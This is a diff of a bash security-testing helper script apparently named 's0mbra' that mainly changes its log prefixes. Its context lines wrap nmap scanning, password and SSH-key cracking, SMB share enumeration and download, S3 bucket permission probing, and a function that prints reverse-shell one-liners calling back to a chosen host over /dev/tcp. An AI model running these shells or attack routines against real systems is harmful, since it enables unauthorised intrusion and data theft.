@@ -28,37 +28,37 @@ set_ip() {
 # runs $2 port(s) against IP; then -sV -sC -A against every open port found
 full_nmap_scan() {
     if [[ -z "$2" ]]; then 
-        echo -e "$BLUE[+] Running full nmap scan against all ports on $1 ...$CLR"
+        echo -e "$BLUE[s0mbra] Running full nmap scan against all ports on $1 ...$CLR"
         ports=$(nmap -p- $1 | grep open | cut -d'/' -f 1 | tr '\n' ',')
-        echo -e "$BLUE[+] running version detection + nse scripts against $ports...$CLR"
+        echo -e "$BLUE[s0mbra] running version detection + nse scripts against $ports...$CLR"
         nmap -p"$ports" -sV -sC -A -n "$1" -oN ./"$1".log -oX ./"$1".xml
     else
-        echo -e "$BLUE[+] Running full nmap scan against $2 port(s) on $1 ...$CLR"
+        echo -e "$BLUE[s0mbra] Running full nmap scan against $2 port(s) on $1 ...$CLR"
         echo -e "   ...search open ports...$CLR"
         ports=$(nmap --top-ports "$2" $1 | grep open | cut -d'/' -f 1 | tr '\n' ',')
-        echo -e "$BLUE[+] running version detection + nse scripts against $ports...$CLR"
+        echo -e "$BLUE[s0mbra] running version detection + nse scripts against $ports...$CLR"
         nmap -p"$ports" -sV -sC -A -n "$1" -oN ./"$1".log -oX ./"$1".xml
     fi
 
-    echo -e "$BLUE\n[+] Done! $CLR"
+    echo -e "$BLUE\n[s0mbra] Done! $CLR"
 }
 
 # runs --top-ports $2 against IP
 quick_nmap_scan() {
     if [[ -z "$2" ]]; then 
-        echo -e "$BLUE[+] Running nmap scan against all ports on $1 ...$CYAN"
+        echo -e "$BLUE[s0mbra] Running nmap scan against all ports on $1 ...$CYAN"
         nmap -p- $1 
     else
-        echo -e "$BLUE[+] Running nmap scan against top $2 ports on $1 ...$CYAN"
+        echo -e "$BLUE[s0mbra] Running nmap scan against top $2 ports on $1 ...$CYAN"
         nmap --top-ports $2 $1
     fi
     
-    echo -e "$BLUE\n[+] Done! $CLR"
+    echo -e "$BLUE\n[s0mbra] Done! $CLR"
 }
 
 # runs Python 3 built-in HTTP server on [PORT]
 http() {
-    echo -e "$BLUE[+] Running Simple HTTP Server in current directory on port $1$CLR"
+    echo -e "$BLUE[s0mbra] Running Simple HTTP Server in current directory on port $1$CLR"
     echo -e "$GRAY\navailable network interfaces:$YELLOW"
     ifconfig | grep -e 'inet\s' |cut -d' ' -f 2
     echo -e "$GRAY\navailable files/folders in SERVER ROOT: $CLR"
@@ -74,7 +74,7 @@ http() {
 
 # runs john with rockyou.txt against hash type [FORMAT] and file [HASHES]
 rockyou_john() {
-    echo -e "$BLUE[+] Running john with rockyou dictionary against $1 of type $2$CLR"
+    echo -e "$BLUE[s0mbra] Running john with rockyou dictionary against $1 of type $2$CLR"
     echo > "$HACKING_HOME"/tools/jtr/run/john.pot
     if [[ -n $2 ]]; then
         "$HACKING_HOME"/tools/jtr/run/john --wordlist="$HACKING_HOME"/dictionaries/rockyou.txt "$1" --format="$2"
@@ -86,35 +86,35 @@ rockyou_john() {
 
 # ZIP password cracking with rockyou.txt
 rockyou_zip() {
-    echo -e "$BLUE[+] Running $MAGENTA zip2john $BLUE and prepare hash for hashcat..."
+    echo -e "$BLUE[s0mbra] Running $MAGENTA zip2john $BLUE and prepare hash for hashcat..."
     "$HACKING_HOME"/tools/jtr/run/zip2john "$1" | cut -d ':' -f 2 > ./hashes.txt
-    echo -e "$BLUE[+] Starting $MAGENTA hashcat $BLUE (using $YELLOW rockyou.txt $BLUE dictionary against $YELLOW hashes.txt $BLUE file)...$CLR"
+    echo -e "$BLUE[s0mbra] Starting $MAGENTA hashcat $BLUE (using $YELLOW rockyou.txt $BLUE dictionary against $YELLOW hashes.txt $BLUE file)...$CLR"
     hashcat -m 13600 ./hashes.txt ~/hacking/dictionaries/rockyou.txt
 }
 
 # converts id_rsa to JTR format for cracking SSH key
 ssh_to_john() {
-    echo -e "$BLUE[+] Converting SSH id_rsa key to JTR format to crack it$CLR"
+    echo -e "$BLUE[s0mbra] Converting SSH id_rsa key to JTR format to crack it$CLR"
     python "$HACKING_HOME"/tools/jtr/run/sshng2john.py "$1" > "$1".hash
-    echo -e "$BLUE[+] We have a hash.\n"
-    echo -e "$BLUE[+] Let's now crack it!"
+    echo -e "$BLUE[s0mbra] We have a hash.\n"
+    echo -e "$BLUE[s0mbra] Let's now crack it!"
     rockyou_john "$1".hash
 }
 
 # runs unminify on $1 JavaScript file
 um() {
     FILENAME=$1
-    echo -e "$BLUE[+] Unminify $FILENAME...$CLR"
+    echo -e "$BLUE[s0mbra] Unminify $FILENAME...$CLR"
     unminify $FILENAME > unmimified.js
-    echo -e "\n\n[+]Done."
+    echo -e "\n\n[s0mbra]Done."
 }
 
 # static code analysis of npm module installed in ~/node_modules
 # with nodestructor and semgrep
 snyktest() {
-    echo -e "$BLUE[+] Starting snyk test in current directory...$CLR"
+    echo -e "$BLUE[s0mbra] Starting snyk test in current directory...$CLR"
     snyk test
-    echo -e "\n\n[+]Done."
+    echo -e "$BLUE[s0mbra] Done."
 }
 
 # enumerates SMB shares on [IP] - port 445 has to be open
@@ -131,16 +131,16 @@ smb_enum() {
         password="$3"
     fi
 
-    echo -e "$BLUE[+] Enumerating SMB shares with nmap on $1...$CLR"
+    echo -e "$BLUE[s0mbra] Enumerating SMB shares with nmap on $1...$CLR"
     nmap -Pn -p445 --script=smb-enum-shares.nse,smb-enum-users.nse "$1"
-    echo -e "$YELLOW\n[+] smbmap -u $username -p $password against\t\t -> $1...$CLR"
+    echo -e "$YELLOW\n[s0mbra] smbmap -u $username -p $password against\t\t -> $1...$CLR"
     smbmap -H "$1" -u "$username" -p "$password" 2>&1 | tee __disks
     for d in $(grep 'READ' __disks | cut -d' ' -f 1); do
-        echo -e "$YELLOW\n[+] content of $d directory saved to $1__shares_listings $CLR"
+        echo -e "$YELLOW\n[s0mbra] content of $d directory saved to $1__shares_listings $CLR"
         smbmap -H "$IP" -u "$username" -p "$password" -R "$d" >> "$1"__shares_listings
     done
     rm -f __disks
-    echo -e "\n[+] Done."
+    echo -e "$BLUE[s0mbra] Done."
 }
 
 # download file from SMB share
@@ -157,52 +157,52 @@ smb_get_file() {
         password="$3"
     fi
 
-    echo -e "$BLUE[+] Downloading file $4 from $1...$CLR"
+    echo -e "$BLUE[s0mbra] Downloading file $4 from $1...$CLR"
     echo -e "$GREEN"
     smbmap -H "$1" -u "$2" -p "$3" --download "$4"
     echo -e "$CLR"
-    echo -e "\n[+] Done."
+    echo -e "$BLUE[s0mbra] Done."
 }
 
 # mounts SMB share at ./mnt/shares
 smb_mount() {
-    echo -e "$BLUE[+] Mounting SMB $2 share from $1 at ./mnt/shares...$CLR"
+    echo -e "$BLUE[s0mbra] Mounting SMB $2 share from $1 at ./mnt/shares...$CLR"
     mkdir -p mnt/shares
     echo "//$3@$1/$2"
     mount_smbfs "//$3@$1/$2" ./mnt/shares
-    echo -e "$YELLOW\n[+] Locally available shares:\n.$CLR"
+    echo -e "$YELLOW\n[s0mbra] Locally available shares:\n.$CLR"
     ls -l ./mnt/shares
-    echo -e "\n[+] Done."
+    echo -e "$BLUE[s0mbra] Done."
 }
 
 # umounts from ./mnt/shares and delete it
 smb_umount() {
-    echo -e "$BLUE[+] Unmounting SMB share(s) from ./mnt/shares...$CLR"
+    echo -e "$BLUE[s0mbra] Unmounting SMB share(s) from ./mnt/shares...$CLR"
     umount ./mnt/shares
     rm -rf ./mnt
-    echo -e "\n[+] Done."
+    echo -e "$BLUE[s0mbra] Done."
 }
 
 # if RPC on port 111 shows in rpcinfo that nfs on port 2049 is available
 # we can enumerate nfs shares available:
 nfs_enum() {
-    echo -e "$BLUE[+] Enumerating nfs shares (TCP 2049) on $1...$CLR"
+    echo -e "$BLUE[s0mbra] Enumerating nfs shares (TCP 2049) on $1...$CLR"
     nmap -Pn -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount "$1"
-    echo -e "\n[+] Done."
+    echo -e "$BLUE[s0mbra] Done."
 }
 
 # executes httpx on the list of host(s)
 htpx() {
-    echo -e "$BLUE[+] Running httpx enumeration on $1 domain(s) file; save output to $2...$CLR\n"
+    echo -e "$BLUE[s0mbra] Running httpx enumeration on $1 domain(s) file; save output to $2...$CLR\n"
     httpx -silent -status-code -web-server -tech-detect -l $1 -mc 200,403,500 -o $2
-    echo -e "\n[+] Done."
+    echo -e "$BLUE[s0mbra] Done."
 }
 
 # automated recon: subfinder + nmap + httpx + ffuf | on domain
 recon() {
     TMPDIR=$(pwd)
     START_TIME=$(date)
-    echo -e "$BLUE[+] Running quick, dirty recon on $1 domain: subfinder + httpx + ffuf on 200 OK...$CLR\n"
+    echo -e "$BLUE[s0mbra] Running quick, dirty recon on $1 domain: subfinder + httpx + ffuf on 200 OK...$CLR\n"
 
     # subfinder
     echo -e "\n$GREEN--> subfinder$CLR\n"
@@ -227,13 +227,13 @@ recon() {
     done
 
     END_TIME=$(date)
-    echo -e "\n$GREEN[+] Finished!"
+    echo -e "\n$GREEN[s0mbra] Finished!"
     echo -e "\nstarted at: $RED  $START_TIME $GREEN"
     echo -e "finished at: $RED $END_TIME $GREEN\n"
     echo -e "  subfinder output file -> $GRAY $TMPDIR/s0mbra_subfinder.tmp$GREEN"
     echo -e "  httpx output file -> $GRAY $TMPDIR/s0mbra_httpx.tmp$GREEN"
     echo -e "  nmap output file -> $GRAY $TMPDIR/s0mbra_recon_nmap.tmp"
-    echo -e "\n$BLUE[+] Done.$CLR"
+    echo -e "\n$BLUE[s0mbra] Done.$CLR"
 }
 
 # does recon on URL: nmap, ffuf, nuclei, other smaller tools, ...?
@@ -252,7 +252,7 @@ ransack() {
     TMPDIR=$(pwd)/s0mbra
 
     START_TIME=$(date)
-    echo -e "$BLUE[+] Running bruteforced, dirty, noisy as hell recon on $PROTO://$HOSTNAME : nmap + ffuf + nuclei...$CLR"
+    echo -e "$BLUE[s0mbra] Running bruteforced, dirty, noisy as hell recon on $PROTO://$HOSTNAME : nmap + ffuf + nuclei...$CLR"
 
     # onaws
     echo -e "\n$GREEN--> onaws? $CLR\n"
@@ -274,42 +274,42 @@ ransack() {
     nuclei -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -exclude-severity info -u $PROTO://$HOSTNAME -o $TMPDIR/s0mbra_nuclei_$HOSTNAME.log
 
     END_TIME=$(date)
-    echo -e "\n$GREEN[+] Finished!"
+    echo -e "\n$GREEN[s0mbra] Finished!"
     echo -e "\nstarted at: $RED  $START_TIME $GREEN"
     echo -e "finished at: $RED $END_TIME $GREEN\n"
     
-    echo -e "\n$BLUE[+] Done.$CLR"
+    echo -e "\n$BLUE[s0mbra] Done.$CLR"
 }
 
 kiterunner() {
     HOSTNAME=$1
-    echo -e "$BLUE[+] Running kiterunner using apis file...$CLR\n"
+    echo -e "$BLUE[s0mbra] Running kiterunner using apis file...$CLR\n"
 
     kr scan apis -w $DICT_HOME/routes-large.kite -x 20 -j 100 --fail-status-codes 400,401,404,403,501,502,426,411
-    echo -e "\n$BLUE[+] Done.$CLR"
+    echo -e "\n$BLUE[s0mbra] Done.$CLR"
 }
 
 # Python Static Source Code analysis
 pysast() {
     DIR_NAME=$1
-    echo -e "$BLUE[+] Running pyflakes against $DIR_NAME $CLR\n"
+    echo -e "$BLUE[s0mbra] Running pyflakes against $DIR_NAME $CLR\n"
     python3 -m pyflakes $DIR_NAME
 
-    echo -e "$BLUE[+] Running mypy against $DIR_NAME $CLR\n"
+    echo -e "$BLUE[s0mbra] Running mypy against $DIR_NAME $CLR\n"
     python3 -m mypy $DIR_NAME
 
-    echo -e "\n$BLUE[+] Running bandit against $DIR_NAME $CLR\n"
+    echo -e "\n$BLUE[s0mbra] Running bandit against $DIR_NAME $CLR\n"
     python3 -m bandit -r $DIR_NAME
 
-    echo -e "\n$BLUE[+] Running vulture against $DIR_NAME $CLR\n"
+    echo -e "\n$BLUE[s0mbra] Running vulture against $DIR_NAME $CLR\n"
     python3 -m vulture $DIR_NAME
 
-    echo -e "\n$BLUE[+] Done.$CLR"
+    echo -e "\n$BLUE[s0mbra] Done.$CLR"
 }
 
 # checking AWS S3 bucket
 s3() {
-    echo -e "$BLUE[+] Checking AWS S3 $1 bucket$CLR"
+    echo -e "$BLUE[s0mbra] Checking AWS S3 $1 bucket$CLR"
     aws s3 ls "s3://$1" --no-sign-request 2> /dev/null
     if [[ "$?" == 0 ]]; then
         echo -e "\n$GREEN+ content of the bucket can be listed!$CLR"
@@ -356,12 +356,12 @@ s3() {
     elif [[ "$?" != 0 ]]; then
         echo -e "\n$RED- nope, can't grant control with --grant-full-control ... :/$CLR"
     fi
-    echo -e "\n[+] Done."
+    echo -e "$BLUE[s0mbra] Done."
 }
 
 s3go() {
     clear
-    echo -e "$BLUE[+] Getting $2 from $1 bucket...$CLR"
+    echo -e "$BLUE[s0mbra] Getting $2 from $1 bucket...$CLR"
 
     aws s3api get-object-acl --bucket "$1" --key "$2" 2> /dev/null
     if [[ "$?" == 0 ]]; then
@@ -380,25 +380,25 @@ s3go() {
 
 dex_to_jar() {
     clear
-    echo -e "$BLUE[+] Exporting $1 into .jar...$CLR"
+    echo -e "$BLUE[s0mbra] Exporting $1 into .jar...$CLR"
     d2j-dex2jar  --force $1
 }
 
 decompile_jar() {
     clear
-    echo -e "$BLUE[+] Opening $1 in JD-Gui...$CLR"
+    echo -e "$BLUE[s0mbra] Opening $1 in JD-Gui...$CLR"
     java -jar /Users/bl4de/hacking/tools/Java_Decompilers/jd-gui-1.6.3.jar $1
 }
 
 jadx() {
     clear
-    echo -e "$BLUE[+] Opening $1 in JADX...$CLR"
+    echo -e "$BLUE[s0mbra] Opening $1 in JADX...$CLR"
     /Users/bl4de/hacking/tools/Java_Decompilers/jadx/bin/jadx-gui $1
 }
 
 apk() {
     clear
-    echo -e "$BLUE[+] OK, let's see this APK...$CLR"
+    echo -e "$BLUE[s0mbra] OK, let's see this APK...$CLR"
     unzip -d unzipped $1
     if [[ "$?" == 0 ]]; then
         echo -e "\n$GREEN+ Unizpped, now run apktool on it...$CLR"
@@ -410,14 +410,14 @@ apk() {
 
 abe() {
     clear
-    echo -e "$BLUE[+] Extracting $1.ab backup into $1.tar...$CLR"
+    echo -e "$BLUE[s0mbra] Extracting $1.ab backup into $1.tar...$CLR"
     java -jar /Users/bl4de/hacking/tools/Java_Decompilers/android-backup-extractor/build/libs/abe.jar unpack $1.ab $1.tar
     if [[ "$?" == 0 ]]; then
-        echo -e "\n$GREEN[+] Success! $1.ab unpacked and $1.tar was created..."
-        echo -e "[+] Let's untar some files, shall we?$CLR"
+        echo -e "\n$GREEN[s0mbra] Success! $1.ab unpacked and $1.tar was created..."
+        echo -e "[s0mbra] Let's untar some files, shall we?$CLR"
         rm -rf $1_extracted && mkdir ./$1_extracted
         tar -xf $1.tar -C $1_extracted
-        echo -e "\n$GREEN[+] tar extracted, folder(s) created:$CLR"
+        echo -e "\n$GREEN[s0mbra] tar extracted, folder(s) created:$CLR"
         ls -l $1_extracted
     elif [[ "$?" != 0 ]]; then
         echo -e "\n$RED- Damn... :/$CLR"
@@ -429,7 +429,7 @@ fu() {
     # adjust here to add/remove HTTP response status code(s) to match on:
     HTTP_RESP_CODES=200,206,301,302,403,500
     
-    echo -e "$BLUE[+] Enumerate web resources on $1 with $2.txt dictionary matching $HTTP_RESP_CODES ...$CLR"
+    echo -e "$BLUE[s0mbra] Enumerate web resources on $1 with $2.txt dictionary matching $HTTP_RESP_CODES ...$CLR"
     
     if [[ -n $3 ]]; then
         if [[ $3 == "/" ]]; then
@@ -443,14 +443,14 @@ fu() {
     else
         ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$2.txt -u $1FUZZ -mc $HTTP_RESP_CODES -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
     fi
-    echo -e "$BLUE\n[+] Done! $CLR"
+    echo -e "$BLUE\n[s0mbra] Done! $CLR"
 }
 
 generate_shells() {
     clear
     port=$2
 
-    echo -e "$BLUE[+] OK, here are your shellz...\n$CLR"
+    echo -e "$BLUE[s0mbra] OK, here are your shellz...\n$CLR"
 
     echo -e " $CLR[bash]\033[0m bash -i >& /dev/tcp/$1/$port 0>&1"
     echo -e " $CLR[bash]\033[0m 0<&196;exec 196<>/dev/tcp/$1/$port; sh <&196 >&196 2>&196"
@@ -481,7 +481,7 @@ generate_shells() {
 }
 
 pwn() {
-    echo -e "$BLUE[+] Running automated recon on $1...\n    Puede tomar un poco tiempo, tienes que ser paciente... ;)  $YELLOW"
+    echo -e "$BLUE[s0mbra] Running automated recon on $1...\n    Puede tomar un poco tiempo, tienes que ser paciente... ;)  $YELLOW"
 }
 
 cmd=$1
